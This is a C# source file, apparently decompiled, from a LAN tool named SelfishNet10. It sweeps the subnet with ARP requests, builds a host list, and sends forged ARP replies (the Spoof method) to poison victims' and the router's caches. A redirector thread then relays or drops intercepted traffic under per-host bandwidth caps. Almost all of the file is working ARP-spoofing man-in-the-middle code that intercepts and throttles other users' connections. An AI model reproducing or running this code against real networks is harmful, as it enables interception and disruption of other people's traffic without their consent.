using PcapNet;
using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SelfishNet10
{
    public class CArp : IDisposable
    {
        private bool isListeningArp;

        private bool isRedirecting;

        private bool isDiscovering;

        private PcList pcList;

        private NetworkInterface nicNet;

        private CPcapNet pcaparp;

        private CPcapNet pcapredirect;

        private Thread arpListenerThread;

        private Thread redirectorThread;

        private Thread discoveringThread;

        private EventWaitHandle arpListenerThreadTerminated;

        private EventWaitHandle redirectorThreadTerminated;

        private EventWaitHandle discovererThreadTerminated;

        public byte[] localIP;

        public byte[] localMAC;

        public byte[] netmask;

        public byte[] routerIP;

        public byte[] routerMAC;

        public byte[] broadcastMac;
        private bool disposedValue;

        public CArp(NetworkInterface nic, PcList pclist)
        {
            this.pcList = pclist;
            this.nicNet = nic;
            int num = 0;
            if (0 < nic.GetIPProperties().UnicastAddresses.Count)
            {
                do
                {
                    if (!Convert.ToString(this.nicNet.GetIPProperties().UnicastAddresses[num].Address.AddressFamily).EndsWith("V6"))
                    {
                        CArp addressBytes = this;
                        addressBytes.localIP = addressBytes.nicNet.GetIPProperties().UnicastAddresses[num].Address.GetAddressBytes();
                        CArp cArp = this;
                        cArp.netmask = cArp.nicNet.GetIPProperties().UnicastAddresses[num].IPv4Mask.GetAddressBytes();
                    }
                    num++;
                }
                while (num < this.nicNet.GetIPProperties().UnicastAddresses.Count);
            }
            CArp addressBytes1 = this;
            addressBytes1.localMAC = addressBytes1.nicNet.GetPhysicalAddress().GetAddressBytes();
            if (this.nicNet.GetIPProperties().GatewayAddresses.Count > 0)
            {
                CArp cArp1 = this;
                cArp1.routerIP = cArp1.nicNet.GetIPProperties().GatewayAddresses[0].Address.GetAddressBytes();
            }
            byte[] numArray = new byte[6];
            this.broadcastMac = numArray;
            int num1 = 0;
            do
            {
                numArray[num1] = 255;
                num1++;
            }
            while (num1 < 6);
            this.pcaparp = new CPcapNet();
            this.pcapredirect = new CPcapNet();
            this.arpListenerThreadTerminated = new EventWaitHandle(false, EventResetMode.AutoReset);
            this.redirectorThreadTerminated = new EventWaitHandle(false, EventResetMode.AutoReset);
            this.discovererThreadTerminated = new EventWaitHandle(false, EventResetMode.AutoReset);
            this.isListeningArp = false;
            this.isDiscovering = false;
            this.isRedirecting = false;
        }

        //private void ~CArp()
        //{
        //	if (this.isDiscovering)
        //	{
        //		this.isDiscovering = false;
        //		this.discovererThreadTerminated.WaitOne();
        //	}
        //	if (this.isListeningArp)
        //	{
        //		this.isListeningArp = false;
        //		this.arpListenerThreadTerminated.WaitOne();
        //	}
        //	if (this.isRedirecting)
        //	{
        //		this.isRedirecting = false;
        //		this.redirectorThreadTerminated.WaitOne();
        //	}
        //	this.completeUnspoof();
        //}

        private void arpListener()
        {
            byte[] numArray = null;
            packet_headers packetHeader = null;
            this.isListeningArp = true;
            do
            {
                if (this.pcaparp.pcapnet_next_ex(out packetHeader, out numArray) == 0)
                {
                    continue;
                }
                byte[] numArray1 = new byte[6];
                Array.Copy(numArray, 6, numArray1, 0, 6);
                if (tools.areValuesEqual(numArray1, this.localMAC) || numArray[21].ToString().CompareTo("2") != 0)
                {
                    continue;
                }
                byte[] numArray2 = new byte[4];
                byte[] numArray3 = new byte[6];
                Array.Copy(numArray, 22, numArray3, 0, 6);
                Array.Copy(numArray, 28, numArray2, 0, 4);
                PC pC = new PC()
                {
                    ip = new IPAddress(numArray2),
                    mac = new PhysicalAddress(numArray3),
                    capDown = 0,
                    capUp = 0,
                    isLocalPc = false,
                    name = "",
                    nbPacketReceivedSinceLastReset = 0,
                    nbPacketSentSinceLastReset = 0,
                    redirect = true,
                    timeSinceLastRarp = DateTime.Now,
                    totalPacketReceived = 0,
                    totalPacketSent = 0
                };
                if (!tools.areValuesEqual(numArray2, this.routerIP))
                {
                    pC.isGateway = false;
                }
                else
                {
                    this.routerMAC = numArray1;
                    pC.isGateway = true;
                }
                this.pcList.addPcToList(pC);
            }
            while (this.isListeningArp);
            this.arpListenerThreadTerminated.Set();
        }

        public byte[] buildArpPacket(byte[] destMac, byte[] srcMac, short arpType, byte[] arpSrcMac, byte[] arpSrcIp, byte[] arpDestMac, byte[] arpDestIP)
        {
            byte[] numArray = new byte[42];
            Array.Copy(destMac, 0, numArray, 0, 6);
            Array.Copy(srcMac, 0, numArray, 6, 6);
            numArray[12] = 8;
            numArray[13] = 6;
            numArray[14] = 0;
            numArray[15] = 1;
            numArray[16] = 8;
            numArray[17] = 0;
            numArray[18] = 6;
            numArray[19] = 4;
            numArray[20] = 0;
            numArray[21] = (byte)arpType;
            Array.Copy(arpSrcMac, 0, numArray, 22, 6);
            Array.Copy(arpSrcIp, 0, numArray, 28, 4);
            Array.Copy(arpDestMac, 0, numArray, 32, 6);
            Array.Copy(arpDestIP, 0, numArray, 38, 4);
            return numArray;
        }

        public void completeUnspoof()
        {
            PC router = this.pcList.getRouter();
            if (router != null)
            {
                int num = 0;
                if (0 < this.pcList.pclist.Count)
                {
                    do
                    {
                        CArp cArp = this;
                        cArp.UnSpoof(((PC)cArp.pcList.pclist[num]).ip, router.ip);
                        num++;
                    }
                    while (num < this.pcList.pclist.Count);
                }
            }
        }

        private void discoverer()
        {
            int num;
            int num1;
            int num2;
            this.isDiscovering = true;
            IPAddress pAddress = new IPAddress(this.netmask);
            char[] chrArray = new char[] { '.', '\u0003' };
            string[] strArrays = pAddress.ToString().Split(chrArray);
            int[] numArray = new int[4];
            int num3 = 0;
            do
            {
                numArray[num3] = Convert.ToInt32(strArrays[num3]);
                num3++;
            }
            while (num3 < 4);
            IPAddress pAddress1 = new IPAddress(this.localIP);
            char[] chrArray1 = new char[] { '.', '\u0003' };
            string[] strArrays1 = pAddress1.ToString().Split(chrArray1);
            int[] numArray1 = new int[4];
            int num4 = 0;
            do
            {
                numArray1[num4] = Convert.ToInt32(strArrays1[num4]);
                num4++;
            }
            while (num4 < 4);
            int num5 = numArray[0];
            int num6 = 256 - num5;
            int num7 = numArray1[0] / num6 * num6;
            int num8 = (255 - num5) / num6 + num7;
            if (num8 < num7 - num5 + 256)
            {
                do
                {
                    int num9 = numArray[1];
                    int num10 = -num9;
                    int num11 = numArray1[1] / (num10 + 256) * (num10 + 256);
                    int num12 = (num10 + 255) / (num10 + 256) + num11;
                    if (num12 < num11 - num9 + 256)
                    {
                        do
                        {
                            int num13 = numArray[2];
                            int num14 = -num13;
                            int num15 = numArray1[2] / (num14 + 256) * (num14 + 256);
                            int num16 = (num14 + 255) / (num14 + 256) + num15;
                            if (num16 < num15 - num13 + 256)
                            {
                                int num17 = numArray1[3];
                                int num18 = numArray[3];
                                do
                                {
                                    int num19 = -num18;
                                    int num20 = num17 / (num19 + 256) * (num19 + 256);
                                    int num21 = (num19 + 255) / (num19 + 256) + num20;
                                    if (num21 < num20 - num18 + 256)
                                    {
                                        while (this.isDiscovering)
                                        {
                                            string[] str = new string[] { num8.ToString(), ".", num12.ToString(), ".", num16.ToString(), ".", num21.ToString() };
                                            this.findMac(string.Concat(str));
                                            Thread.Sleep(5);
                                            num21++;
                                            num18 = numArray[3];
                                            int num22 = 256 - num18;
                                            num17 = numArray1[3];
                                            if (num21 >= num17 / num22 * num22 - num18 + 256)
                                            {
                                                goto Label1;
                                            }
                                        }
                                        this.discovererThreadTerminated.Set();
                                        return;
                                    }
                                Label1:
                                    num16++;
                                    num13 = numArray[2];
                                    num2 = 256 - num13;
                                }
                                while (num16 < numArray1[2] / num2 * num2 - num13 + 256);
                            }
                            num12++;
                            num9 = numArray[1];
                            num1 = 256 - num9;
                        }
                        while (num12 < numArray1[1] / num1 * num1 - num9 + 256);
                    }
                    num8++;
                    num5 = numArray[0];
                    num = 256 - num5;
                }
                while (num8 < numArray1[0] / num * num - num5 + 256);
            }
            this.isDiscovering = false;
            this.discovererThreadTerminated.Set();
        }

        //protected virtual void Dispose(bool flag)
        //{
        //	if (!flag)
        //	{
        //		this.Finalize();
        //	}
        //	else
        //	{
        //		this.~CArp();
        //	}
        //}

        //public sealed override void Dispose()
        //{
        //	//this.Dispose(true);
        //	GC.SuppressFinalize(this);
        //}

        public void findMac(string ip)
        {
            string str = null;
            if (!(this.pcaparp.nicHandle == IntPtr.Zero) || this.pcaparp.pcapnet_openLive(this.nicNet.Id, 65535, 0, 1, str))
            {
                byte[] addressBytes = tools.getIpAddress(ip).GetAddressBytes();
                byte[] numArray = this.broadcastMac;
                byte[] numArray1 = this.localMAC;
                this.pcaparp.pcapnet_sendpacket(this.buildArpPacket(numArray, numArray1, 1, numArray1, this.localIP, numArray, addressBytes));
            }
            else
            {
                MessageBox.Show(str);
            }
        }

        public void findMacRouter()
        {
            CArp cArp = this;
            cArp.findMac((new IPAddress(cArp.routerIP)).ToString());
        }

        private void redirector()
        {
            byte[] numArray = null;
            packet_headers packetHeader = null;
            this.isRedirecting = true;
            byte[] numArray1 = new byte[6];
            byte[] numArray2 = new byte[4];
            byte[] numArray3 = new byte[4];
            PC router = this.pcList.getRouter();
            if (router != null)
            {
                this.routerMAC = router.mac.GetAddressBytes();
            }
            if (this.routerMAC != null)
            {
                if (this.isRedirecting)
                {
                    do
                    {
                        if (this.pcapredirect.pcapnet_next_ex(out packetHeader, out numArray) == 0)
                        {
                            continue;
                        }
                        Array.Copy(numArray, 6, numArray1, 0, 6);
                        if (tools.areValuesEqual(numArray1, this.localMAC))
                        {
                            Array.Copy(numArray, 26, numArray2, 0, 4);
                            if (!tools.areValuesEqual(numArray2, this.localIP))
                            {
                                continue;
                            }
                            this.pcList.getLocalPC().nbPacketSentSinceLastReset += (int)packetHeader.caplen;
                        }
                        else if (!tools.areValuesEqual(numArray1, this.routerMAC))
                        {
                            Array.Copy(numArray, 30, numArray3, 0, 4);
                            if (tools.areValuesEqual(numArray3, this.localIP))
                            {
                                continue;
                            }
                            PC pCFromMac = this.pcList.getPCFromMac(numArray1);
                            if (pCFromMac == null)
                            {
                                continue;
                            }
                            int num = pCFromMac.capUp;
                            if (num != 0 && num <= pCFromMac.nbPacketSentSinceLastReset || !pCFromMac.redirect)
                            {
                                continue;
                            }
                            Array.Copy(this.routerMAC, 0, numArray, 0, 6);
                            Array.Copy(this.localMAC, 0, numArray, 6, 6);
                            this.pcapredirect.pcapnet_sendpacket(numArray);
                            pCFromMac.nbPacketSentSinceLastReset += (int)packetHeader.caplen;
                        }
                        else
                        {
                            Array.Copy(numArray, 30, numArray3, 0, 4);
                            if (!tools.areValuesEqual(numArray3, this.localIP))
                            {
                                PC pCFromIP = this.pcList.getPCFromIP(numArray3);
                                if (pCFromIP == null)
                                {
                                    continue;
                                }
                                int num1 = pCFromIP.capDown;
                                if (num1 != 0 && num1 <= pCFromIP.nbPacketReceivedSinceLastReset || !pCFromIP.redirect)
                                {
                                    continue;
                                }
                                Array.Copy(pCFromIP.mac.GetAddressBytes(), 0, numArray, 0, 6);
                                Array.Copy(this.localMAC, 0, numArray, 6, 6);
                                this.pcapredirect.pcapnet_sendpacket(numArray);
                                pCFromIP.nbPacketReceivedSinceLastReset += (int)packetHeader.caplen;
                            }
                            else
                            {
                                this.pcList.getLocalPC().nbPacketReceivedSinceLastReset += (int)packetHeader.caplen;
                            }
                        }
                    }
                    while (this.isRedirecting);
                }
                this.redirectorThreadTerminated.Set();
            }
            else
            {
                MessageBox.Show("no router found to redirect packet");
                this.isRedirecting = false;
            }
        }

        private void _007ECArp()
        {
            if (isDiscovering)
            {
                isDiscovering = false;
                discovererThreadTerminated.WaitOne();
            }
            if (isListeningArp)
            {
                isListeningArp = false;
                arpListenerThreadTerminated.WaitOne();
            }
            if (isRedirecting)
            {
                isRedirecting = false;
                redirectorThreadTerminated.WaitOne();
            }
            completeUnspoof();
        }

        public void Spoof(IPAddress ip1, IPAddress ip2)
        {
            PC pCFromIP = this.pcList.getPCFromIP(ip1.GetAddressBytes());
            PC pC = this.pcList.getPCFromIP(ip2.GetAddressBytes());
            if (pCFromIP != null && pC != null)
            {
                byte[] numArray = this.localMAC;
                this.pcaparp.pcapnet_sendpacket(this.buildArpPacket(pCFromIP.mac.GetAddressBytes(), numArray, 2, numArray, pC.ip.GetAddressBytes(), pCFromIP.mac.GetAddressBytes(), pCFromIP.ip.GetAddressBytes()));
                byte[] numArray1 = this.localMAC;
                this.pcaparp.pcapnet_sendpacket(this.buildArpPacket(pC.mac.GetAddressBytes(), numArray1, 2, numArray1, pCFromIP.ip.GetAddressBytes(), pC.mac.GetAddressBytes(), pC.ip.GetAddressBytes()));
                CArp cArp = this;
                this.pcaparp.pcapnet_sendpacket(cArp.buildArpPacket(cArp.localMAC, pC.mac.GetAddressBytes(), 2, pC.mac.GetAddressBytes(), pC.ip.GetAddressBytes(), this.localMAC, this.localIP));
                byte[] numArray2 = this.localMAC;
                this.pcaparp.pcapnet_sendpacket(this.buildArpPacket(numArray2, numArray2, 2, pCFromIP.mac.GetAddressBytes(), pCFromIP.ip.GetAddressBytes(), this.localMAC, this.localIP));
            }
        }

        public int startArpDiscovery()
        {
            string str = null;
            if (pcaparp.nicHandle == IntPtr.Zero && !this.pcaparp.pcapnet_openLive(this.nicNet.Id, 65535, 0, 1, str))
            {
                MessageBox.Show(str);
                return -1;
            }
            if (!isDiscovering)
            {
                /* modopt(System.Runtime.CompilerServices.IsConst) */
                //Thread thread = new Thread(new ThreadStart(discoverer));
                //this.discoveringThread = thread;
                //thread.Start();
                var task = new Task(() => discoverer(),
                    TaskCreationOptions.LongRunning);
                task.Start();
            }
            return 0;
        }

        public int startArpListener()
        {
            string str = null;
            if (this.pcaparp.nicHandle == IntPtr.Zero && !this.pcaparp.pcapnet_openLive(this.nicNet.Id, 65535, 0, 1, str))
            {
                MessageBox.Show(str);
                return -1;
            }
            if (pcaparp.pcapnet_setFilter("arp", uint.MaxValue) != 0)
            {
                return -2;
            }
            if (!this.isListeningArp)
            {
                /* modopt(System.Runtime.CompilerServices.IsConst) */
                //Thread thread = new Thread(new ThreadStart(this.arpListener));
                //this.arpListenerThread = thread;
                //thread.Start();

                var task = new Task(() => arpListener(), TaskCreationOptions.LongRunning);
                task.Start();
            }
            return 0;
        }

        public int startRedirector()
        {
            string str = null;
            if (this.pcapredirect.nicHandle == IntPtr.Zero && !this.pcapredirect.pcapnet_openLive(this.nicNet.Id, 65535, 0, 1, str))
            {
                MessageBox.Show(str);
                return -1;
            }
            if (this.pcapredirect.pcapnet_setFilter("ip", uint.MaxValue) != 0) // review
            {
                return -2;
            }
            if (!this.isRedirecting)
            {
                /* modopt(System.Runtime.CompilerServices.IsConst) */
                Thread thread = new Thread(new ThreadStart(this.redirector));
                this.redirectorThread = thread;
                thread.Start();
            }
            return 0;
        }

        public void stopArpDiscovery()
        {
            if (this.isDiscovering)
            {
                this.isDiscovering = false;
                this.discovererThreadTerminated.WaitOne();
            }
        }

        public void stopArpListener()
        {
            if (this.isListeningArp)
            {
                this.isListeningArp = false;
                this.arpListenerThreadTerminated.WaitOne();
            }
        }

        public void stopRedirector()
        {
            if (this.isRedirecting)
            {
                this.isRedirecting = false;
                this.redirectorThreadTerminated.WaitOne();
            }
        }

        public void UnSpoof(IPAddress ip1, IPAddress ip2)
        {
            PC pCFromIP = this.pcList.getPCFromIP(ip1.GetAddressBytes());
            PC pC = this.pcList.getPCFromIP(ip2.GetAddressBytes());
            if (pCFromIP != null && pC != null)
            {
                this.pcaparp.pcapnet_sendpacket(this.buildArpPacket(pCFromIP.mac.GetAddressBytes(), pC.mac.GetAddressBytes(), 1, pC.mac.GetAddressBytes(), pC.ip.GetAddressBytes(), this.broadcastMac, pCFromIP.ip.GetAddressBytes()));
                this.pcaparp.pcapnet_sendpacket(this.buildArpPacket(pC.mac.GetAddressBytes(), pCFromIP.mac.GetAddressBytes(), 1, pCFromIP.mac.GetAddressBytes(), pCFromIP.ip.GetAddressBytes(), this.broadcastMac, pC.ip.GetAddressBytes()));
            }
        }

        protected virtual void Dispose([MarshalAs(UnmanagedType.U1)] bool P_0)
        {
            if (P_0)
            {
                _007ECArp();
            }
            else
            {
                //Finalize();
            }
        }

        // // TODO: override finalizer only if 'Dispose(bool disposing)' has code to free unmanaged resources
        // ~CArp()
        // {
        //     // Do not change this code. Put cleanup code in 'Dispose(bool disposing)' method
        //     Dispose(disposing: false);
        // }

        public void Dispose()
        {
            // Do not change this code. Put cleanup code in 'Dispose(bool disposing)' method
            Dispose(true);
            GC.SuppressFinalize(this);
        }
    }
}